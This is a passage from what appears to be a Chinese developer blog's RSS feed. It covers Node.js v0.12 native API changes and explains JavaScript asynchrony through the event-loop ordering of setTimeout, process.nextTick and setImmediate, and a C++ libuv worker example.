    <span class="kt">void</span> <span class="nf">Example</span><span class="p">(</span><span class="n">v8</span><span class="o">::</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">v8</span><span class="o">::</span><span class="n">HandleScope</span> <span class="n">handle_scope</span><span class="p">(</span><span class="n">isolate</span><span class="p">);</span>
      <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">object</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">Object</span><span class="o">::</span><span class="n">New</span><span class="p">(</span><span class="n">isolate</span><span class="p">);</span>
      <span class="n">v8</span><span class="o">::</span><span class="n">Persistent</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">persistent</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">object</span><span class="p">);</span>
      <span class="n">persistent</span><span class="p">.</span><span class="n">SetWeak</span><span class="p">(</span><span class="s">&quot;fortytwo&quot;</span><span class="p">,</span> <span class="n">WeakCallback</span><span class="p">);</span>
    <span class="p">}</span>
</pre></div>
</code></pre>
<h2><a name="v8throwexception-v8isolatethrowexception" class="anchor" href="#v8throwexception-v8isolatethrowexception"><span class="header-link"></span></a>v8::ThrowException()现在变成了 v8::Isolate::ThrowException()</h2>
<p>在Node v0.10中这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">exception</span> <span class="o">=</span> <span class="cm">/* ... */</span><span class="p">;</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">ThrowException</span><span class="p">(</span><span class="n">exception</span><span class="p">);</span>
</pre></div>
</code></pre>
<p>在Node v0.12中这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span> <span class="o">=</span> <span class="cm">/* ... */</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">exception</span> <span class="o">=</span> <span class="cm">/* ... */</span><span class="p">;</span>
    <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">ThrowException</span><span class="p">(</span><span class="n">exception</span><span class="p">);</span>
</pre></div>
</code></pre>
]]></description><link>http://blog.whyun.com/posts/node0-12capi/</link><guid isPermaLink="true">http://blog.whyun.com/posts/node0-12capi/</guid><dc:creator><![CDATA[白一梓]]></dc:creator><pubDate>Tue, 19 May 2015 00:00:00 GMT</pubDate></item><item><title><![CDATA[js异步之惑]]></title><description><![CDATA[<h2><a name="1" class="anchor" href="#1"><span class="header-link"></span></a>1.异步是啥</h2>
<p>与异步对应的就是同步，对于同步我们很好理解，就是代码顺序执行。但是一到异步代码，很多人多少有些理不清。异步，从功能上讲，就是在背后偷偷的执行，不堵塞当前运行的代码；从实现上讲，能够这么做的，就只能靠在当前运行代码中另一起线程或者进程了。举一个使用线程来实现异步的例子：</p>
<pre><code><div class="highlight"><pre><span class="kr">public</span> <span class="kr">class</span> <span class="nx">MyAsync</span> <span class="kr">extends</span> <span class="nx">Thread</span> <span class="p">{</span>
    <span class="kr">private</span> <span class="kr">volatile</span> <span class="kr">boolean</span> <span class="nx">done</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>

    <span class="kr">public</span> <span class="k">void</span> <span class="nx">run</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nx">done</span><span class="p">)</span> <span class="p">{</span><span class="c1">//子线程中的循环</span>
            <span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nx">println</span><span class="p">(</span><span class="s2">&quot;thread out x&quot;</span><span class="p">);</span>
            <span class="k">try</span> <span class="p">{</span>
                <span class="nx">Thread</span><span class="p">.</span><span class="nx">sleep</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">InterruptedException</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">e</span><span class="p">.</span><span class="nx">printStackTrace</span><span class="p">();</span>
<span class="c1">//                Thread.currentThread().interrupt();</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kr">public</span> <span class="kr">synchronized</span> <span class="k">void</span> <span class="nx">setDone</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">done</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kr">public</span> <span class="kr">static</span> <span class="k">void</span> <span class="nx">main</span><span class="p">(</span><span class="nb">String</span> <span class="nx">argv</span><span class="p">[])</span> <span class="p">{</span>
        <span class="nx">MyAsync</span> <span class="nx">t</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MyAsync</span><span class="p">();</span>
        <span class="nx">t</span><span class="p">.</span><span class="nx">start</span><span class="p">();</span><span class="c1">//起子线程</span>
        <span class="kr">long</span> <span class="nx">last</span> <span class="o">=</span> <span class="nx">System</span><span class="p">.</span><span class="nx">currentTimeMillis</span><span class="p">();</span>
        <span class="kr">int</span> <span class="nx">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span><span class="c1">//主线程中循环</span>
            <span class="kr">long</span> <span class="nx">now</span> <span class="o">=</span> <span class="nx">System</span><span class="p">.</span><span class="nx">currentTimeMillis</span><span class="p">();</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">now</span> <span class="o">-</span> <span class="nx">last</span> <span class="o">&gt;</span> <span class="mi">1000</span> <span class="o">*</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">last</span> <span class="o">=</span> <span class="nx">now</span><span class="p">;</span>
                <span class="nx">count</span> <span class="o">++</span><span class="p">;</span>
                <span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nx">println</span><span class="p">(</span><span class="s2">&quot;the &quot;</span> <span class="o">+</span> <span class="nx">count</span> <span class="o">+</span> <span class="s2">&quot;th count.&quot;</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">count</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>

        <span class="p">}</span>

        <span class="nx">t</span><span class="p">.</span><span class="nx">setDone</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</code></pre>
<p><strong>代码1.1 线程示例</strong><br>对于代码1.1的运行结果，有可能是这个样子的：  </p>
<pre><code><div class="highlight"><pre><span class="nx">thread</span> <span class="nx">out</span> <span class="nx">x</span>
<span class="nx">thread</span> <span class="nx">out</span> <span class="nx">x</span>
<span class="nx">thread</span> <span class="nx">out</span> <span class="nx">x</span>
<span class="nx">the</span> <span class="mi">1</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">thread</span> <span class="nx">out</span> <span class="nx">x</span>
<span class="nx">thread</span> <span class="nx">out</span> <span class="nx">x</span>
<span class="nx">the</span> <span class="mi">2</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">thread</span> <span class="nx">out</span> <span class="nx">x</span>
<span class="nx">thread</span> <span class="nx">out</span> <span class="nx">x</span>
<span class="nx">the</span> <span class="mi">3</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
</pre></div>
</code></pre>
<p>代码27-38行起是主线程循环，7-15行是子线程循环，你多运行几次，就可以看出两个循环的输出是很随机的，但是不管运行多少次两个循环的输出都是交叉在一起的。这样我们就可以推断出，运行主线程的代码的时候，子线程的代码也在背后偷偷的运行，说白了两者是并行运行的。</p>
<h2><a name="2-js" class="anchor" href="#2-js"><span class="header-link"></span></a>2.js中的异步</h2>
<p>就是因为异步这个特性，js如今被大家推崇，下面用一个小例子来演示一下js中异步的使用：  </p>
<pre><code><div class="highlight"><pre><span class="kd">function</span> <span class="nx">synchronizedCode</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">last</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">();</span>
    <span class="kd">var</span> <span class="nx">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">now</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">now</span> <span class="o">-</span> <span class="nx">last</span> <span class="o">&gt;</span> <span class="mi">1000</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">last</span> <span class="o">=</span> <span class="nx">now</span><span class="p">;</span>
            <span class="nx">count</span><span class="o">++</span><span class="p">;</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;the %dth count.&#39;</span><span class="p">,</span><span class="nx">count</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">count</span> <span class="o">&gt;</span> <span class="mi">9</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;exist while.&#39;</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;setTimeout 0 occured first.&#39;</span><span class="p">);},</span><span class="mi">0</span><span class="p">);</span>
    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;setTimeout 0 occured second.&#39;</span><span class="p">);},</span><span class="mi">0</span><span class="p">);</span>

    <span class="nx">synchronizedCode</span><span class="p">();</span>
<span class="p">})();</span>
</pre></div>
</code></pre>
<p><strong>代码2.1 setTimeout的例子</strong><br>我们运行代码2.1，然后不管运行多少次，输出都是这个样子的：</p>
<pre><code><div class="highlight"><pre><span class="nx">the</span> <span class="mi">1</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">the</span> <span class="mi">2</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">the</span> <span class="mi">3</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">the</span> <span class="mi">4</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">the</span> <span class="mi">5</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">exist</span> <span class="k">while</span><span class="p">.</span>
<span class="nx">setTimeout</span> <span class="mi">0</span> <span class="nx">occured</span> <span class="nx">first</span><span class="p">.</span>
<span class="nx">setTimeout</span> <span class="mi">0</span> <span class="nx">occured</span> <span class="nx">second</span><span class="p">.</span>
</pre></div>
</code></pre>
<p><strong>输出2.1</strong><br>跟java中的异步和同步代码会交叉输出相比，js中的异步其实是排好队输出的。由于js是单线程执行代码的，所以没有那种交叉输出的效果。那么还有一个问题，while循环明明运行了5秒钟，为何在这期间那两个setTimeout一直没有运行呢？这就和js代码的异步机制有关了。js代码中有帧的概念，对于同步代码是在当前帧运行的，异步代码是在下一帧运行的。对于代码2.1我们给代码运行画一幅图的话，应该是这样的：<br><img src="http://blog.whyun.com/images/js_frame.png" alt="js帧结构"><br><strong>图2.1 js帧结构</strong><br>那么为什么是第一个setTimeout先触发，第二个后触发呢，难道仅仅由于先后顺序？我们把第一个setTimeout改为<code>setTimeout(function() {console.log(&#39;setTimeout 0 occured first.&#39;);},100);</code>,那么输出的时候就会是先输出<code>setTimeout 0 occured second.</code>,在输出<code>setTimeout 0 occured first.</code>。也就是说在第二帧setTimeout的回调的执行顺序不仅与代码顺序有关还和延迟时间有关。<br>在node.js中还有一个特殊的API，就是<code>process.nextTick</code>,虽然已经不推荐使用了，但是已经可以在很多代码中看到它的身影。例如如下代码：</p>
<pre><code><div class="highlight"><pre><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;setTimeout 0 occured first.&#39;</span><span class="p">);},</span><span class="mi">0</span><span class="p">);</span>
    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;setTimeout 0 occured second.&#39;</span><span class="p">);},</span><span class="mi">0</span><span class="p">);</span>
    <span class="nx">process</span><span class="p">.</span><span class="nx">nextTick</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;nextTick occured.&#39;</span><span class="p">);});</span>

    <span class="nx">synchronizedCode</span><span class="p">();</span>
<span class="p">})();</span>
</pre></div>
</code></pre>
<p><strong>代码2.2</strong><br>运行后输出：</p>
<pre><code><div class="highlight"><pre><span class="nx">the</span> <span class="mi">1</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">the</span> <span class="mi">2</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">the</span> <span class="mi">3</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">the</span> <span class="mi">4</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">the</span> <span class="mi">5</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">exist</span> <span class="k">while</span><span class="p">.</span>
<span class="nx">nextTick</span> <span class="nx">occured</span><span class="p">.</span>
<span class="nx">setTimeout</span> <span class="mi">0</span> <span class="nx">occured</span> <span class="nx">first</span><span class="p">.</span>
<span class="nx">setTimeout</span> <span class="mi">0</span> <span class="nx">occured</span> <span class="nx">second</span><span class="p">.</span>  
</pre></div>
</code></pre>
<p><strong>输出2.2</strong><br>之所以nextTick排在所有异步的最前面，是由于nextTick是在第一帧运行的，而其他的都是在第二帧运行的。也就是说代码运行情况是这个样子的：<br><img src="http://blog.whyun.com/images/js_frame2.png" alt=""><br><strong>图2.2 js帧结构</strong><br>接下来再举几个异步API的例子，这次我们添加<code>setImmediate</code>和<code>mkdir</code>两个函数：</p>
<pre><code><div class="highlight"><pre><span class="kd">var</span> <span class="nx">synchronizedCode</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./sync&#39;</span><span class="p">);</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;setTimeout 0 occured first.&#39;</span><span class="p">);},</span><span class="mi">0</span><span class="p">);</span>
    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;setTimeout 0 occured second.&#39;</span><span class="p">);},</span><span class="mi">0</span><span class="p">);</span>
    <span class="nx">process</span><span class="p">.</span><span class="nx">nextTick</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;nextTick occured.&#39;</span><span class="p">);});</span>
    <span class="nx">setImmediate</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;setImmediate occured.&#39;</span><span class="p">)});</span>

    <span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">rand</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">pseudoRandomBytes</span><span class="p">(</span><span class="mi">8</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
    <span class="nx">fs</span><span class="p">.</span><span class="nx">mkdir</span><span class="p">(</span><span class="s1">&#39;d:\\temp\\xx&#39;</span><span class="o">+</span><span class="s1">&#39;\\&#39;</span><span class="o">+</span><span class="nx">rand</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="s1">&#39;错误&#39;</span><span class="p">,</span><span class="nx">err</span><span class="p">.</span><span class="nx">code</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;create directory success.&#39;</span><span class="p">);</span>
        <span class="p">}</span>        
    <span class="p">});</span>

    <span class="nx">synchronizedCode</span><span class="p">();</span>
<span class="p">})();</span>  
</pre></div>
</code></pre>
<p><strong>代码2.3</strong><br>那么他的输出就应该是这样的：  </p>
<pre><code><div class="highlight"><pre><span class="nx">the</span> <span class="mi">1</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">the</span> <span class="mi">2</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">the</span> <span class="mi">3</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">the</span> <span class="mi">4</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">the</span> <span class="mi">5</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">exist</span> <span class="k">while</span><span class="p">.</span>
<span class="nx">nextTick</span> <span class="nx">occured</span><span class="p">.</span>
<span class="nx">setTimeout</span> <span class="mi">0</span> <span class="nx">occured</span> <span class="nx">first</span><span class="p">.</span>
<span class="nx">setTimeout</span> <span class="mi">0</span> <span class="nx">occured</span> <span class="nx">second</span><span class="p">.</span>
<span class="nx">setImmediate</span> <span class="nx">occured</span><span class="p">.</span>
<span class="nx">create</span> <span class="nx">directory</span> <span class="nx">success</span><span class="p">.</span>  
</pre></div>
</code></pre>
<p><strong>输出2.3</strong></p>
<p>等等，问题来了，这里最后一句才打印<code>create directory success</code>,那么是不是程序是在最后一步才创建的文件夹呢，如果真是这样，就有点低效了，起码这个创建文件的工作被那个while循环给延迟了得有5秒钟。不过幸好，这个想法是错误的！node.js中使用libuv来IO或者CPU计算量大的操作，而在libuv中处理这些耗时的操作都是用线程来解决，以避免堵塞住js线程（这一点和android的程序设计思路类似，android开发中使用子线程来处理耗时逻辑，避免对主线程造成卡顿）。这里我们来演示一个libuv的异步处理，在异步处理中模拟一个耗时操作：</p>
<pre><code><div class="highlight"><pre><span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">node</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">string</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">v8</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">nan</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>

<span class="err">#</span><span class="nx">ifdef</span> <span class="nx">WINDOWS_SPECIFIC_DEFINE</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">windows</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="nx">typedef</span> <span class="nx">DWORD</span> <span class="nx">ThreadId</span><span class="p">;</span>
<span class="err">#</span><span class="k">else</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">unistd</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">pthread</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="nx">typedef</span> <span class="nx">unsigned</span> <span class="kr">int</span> <span class="nx">ThreadId</span><span class="p">;</span>
<span class="err">#</span><span class="nx">endif</span>
<span class="nx">using</span> <span class="nx">namespace</span> <span class="nx">v8</span><span class="p">;</span>

<span class="nx">NAN_METHOD</span><span class="p">(</span><span class="nx">async_hello</span><span class="p">);</span>


<span class="kr">static</span> <span class="nx">ThreadId</span> <span class="nx">__getThreadId</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">ThreadId</span> <span class="nx">nThreadID</span><span class="p">;</span>
<span class="err">#</span><span class="nx">ifdef</span> <span class="nx">WINDOWS_SPECIFIC_DEFINE</span>

    <span class="nx">nThreadID</span> <span class="o">=</span> <span class="nx">GetCurrentProcessId</span><span class="p">();</span>
    <span class="nx">nThreadID</span> <span class="o">=</span> <span class="p">(</span><span class="nx">nThreadID</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="nx">GetCurrentThreadId</span><span class="p">();</span>
<span class="err">#</span><span class="k">else</span>
    <span class="nx">nThreadID</span> <span class="o">=</span> <span class="nx">getpid</span><span class="p">();</span>
    <span class="nx">nThreadID</span> <span class="o">=</span> <span class="p">(</span><span class="nx">nThreadID</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="nx">pthread_self</span><span class="p">();</span>
<span class="err">#</span><span class="nx">endif</span>
    <span class="k">return</span> <span class="nx">nThreadID</span><span class="p">;</span>
<span class="p">}</span>

<span class="kr">static</span> <span class="k">void</span> <span class="nx">__tsleep</span><span class="p">(</span><span class="nx">unsigned</span> <span class="kr">int</span> <span class="nx">millisecond</span><span class="p">)</span> <span class="p">{</span>
<span class="err">#</span><span class="nx">ifdef</span> <span class="nx">WINDOWS_SPECIFIC_DEFINE</span>
    <span class="o">::</span><span class="nx">Sleep</span><span class="p">(</span><span class="nx">millisecond</span><span class="p">);</span>
<span class="err">#</span><span class="k">else</span>
    <span class="nx">usleep</span><span class="p">(</span><span class="nx">millisecond</span><span class="o">*</span><span class="mi">1000</span><span class="p">);</span>
<span class="err">#</span><span class="nx">endif</span>
<span class="p">}</span>


<span class="kr">class</span> <span class="nx">ThreadWoker</span> <span class="o">:</span> <span class="kr">public</span> <span class="nx">NanAsyncWorker</span> <span class="p">{</span>
    <span class="kr">private</span><span class="o">:</span>
        <span class="nx">std</span><span class="o">::</span><span class="nx">string</span> <span class="nx">str</span><span class="p">;</span>
    <span class="kr">public</span><span class="o">:</span>
        <span class="nx">ThreadWoker</span><span class="p">(</span><span class="nx">NanCallback</span> <span class="o">*</span><span class="nx">callback</span><span class="p">,</span><span class="nx">std</span><span class="o">::</span><span class="nx">string</span> <span class="nx">str</span><span class="p">)</span>
            <span class="o">:</span> <span class="nx">NanAsyncWorker</span><span class="p">(</span><span class="nx">callback</span><span class="p">),</span> <span class="nx">str</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{}</span>
        <span class="o">~</span><span class="nx">ThreadWoker</span><span class="p">()</span> <span class="p">{}</span>
        <span class="c1">//在该函数内模拟处理过程 ，如i/o阻塞或者cpu高消耗情形的处理。</span>
        <span class="c1">// 注意不能使用v8 api,这个线程不是在js主线程内</span>
        <span class="k">void</span> <span class="nx">Execute</span><span class="p">()</span> <span class="p">{</span>
            <span class="nx">printf</span><span class="p">(</span><span class="s2">&quot;\n%s Thread id : gettid() == %d\n&quot;</span><span class="p">,</span><span class="nx">__FUNCTION__</span><span class="p">,</span><span class="nx">__getThreadId</span><span class="p">());</span>
            <span class="k">for</span> <span class="p">(</span><span class="kr">int</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mi">15</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">__tsleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
                <span class="nx">printf</span><span class="p">(</span><span class="s2">&quot;sleep 1 seconds in uv_work\n&quot;</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">void</span> <span class="nx">HandleOKCallback</span> <span class="p">()</span> <span class="p">{</span>
            <span class="nx">NanScope</span><span class="p">();</span>

            <span class="nx">Local</span><span class="o">&lt;</span><span class="nx">Value</span><span class="o">&gt;</span> <span class="nx">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
                <span class="nx">NanNull</span><span class="p">(),</span>
                <span class="nx">NanNew</span><span class="p">(</span><span class="s2">&quot;the result:&quot;</span><span class="o">+</span><span class="nx">str</span><span class="p">)</span>
            <span class="p">};</span>

            <span class="nx">callback</span><span class="o">-&gt;</span><span class="nx">Call</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nx">argv</span><span class="p">);</span>
        <span class="p">};</span>
<span class="p">};</span>


<span class="nx">NAN_METHOD</span><span class="p">(</span><span class="nx">async_hello</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">printf</span><span class="p">(</span><span class="s2">&quot;\n%s Thread id : gettid() == %d\n&quot;</span><span class="p">,</span><span class="nx">__FUNCTION__</span><span class="p">,</span><span class="nx">__getThreadId</span><span class="p">());</span>
    <span class="nx">NanScope</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">args</span><span class="p">.</span><span class="nx">Length</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span> 
        <span class="nx">NanThrowError</span><span class="p">(</span><span class="s2">&quot;Wrong number of arguments&quot;</span><span class="p">);</span> 
        <span class="nx">NanReturnUndefined</span><span class="p">();</span> 
    <span class="p">}</span>


    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="nx">IsString</span><span class="p">()</span> <span class="o">||</span> <span class="o">!</span><span class="nx">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="nx">IsFunction</span><span class="p">())</span> <span class="p">{</span>
        <span class="nx">NanThrowError</span><span class="p">(</span><span class="s2">&quot;Wrong number of arguments&quot;</span><span class="p">);</span>
        <span class="nx">NanReturnUndefined</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="c1">// 强制转换成函数变量</span>
    <span class="nx">NanCallback</span> <span class="o">*</span><span class="nx">callback</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">NanCallback</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">As</span><span class="o">&lt;</span><span class="nb">Function</span><span class="o">&gt;</span><span class="p">());</span>
    <span class="nx">NanUtf8String</span> <span class="nx">param1</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
    <span class="nx">std</span><span class="o">::</span><span class="nx">string</span> <span class="nx">str</span> <span class="o">=</span> <span class="nx">std</span><span class="o">::</span><span class="nx">string</span><span class="p">(</span><span class="o">*</span><span class="nx">param1</span><span class="p">);</span> 
    <span class="nx">NanAsyncQueueWorker</span><span class="p">(</span><span class="k">new</span> <span class="nx">ThreadWoker</span><span class="p">(</span><span class="nx">callback</span><span class="p">,</span> <span class="nx">str</span><span class="p">));</span>
    <span class="nx">NanReturnUndefined</span><span class="p">();</span> 
<span class="p">}</span>

<span class="k">void</span> <span class="nx">Init</span><span class="p">(</span><span class="nx">Handle</span><span class="o">&lt;</span><span class="nb">Object</span><span class="o">&gt;</span> <span class="nx">exports</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">exports</span><span class="o">-&gt;</span><span class="nx">Set</span><span class="p">(</span><span class="nx">NanNew</span><span class="o">&lt;</span><span class="nb">String</span><span class="o">&gt;</span><span class="p">(</span><span class="s2">&quot;async_hello&quot;</span><span class="p">),</span>
    <span class="nx">NanNew</span><span class="o">&lt;</span><span class="nx">FunctionTemplate</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">async_hello</span><span class="p">)</span><span class="o">-&gt;</span><span class="nx">GetFunction</span><span class="p">());</span>
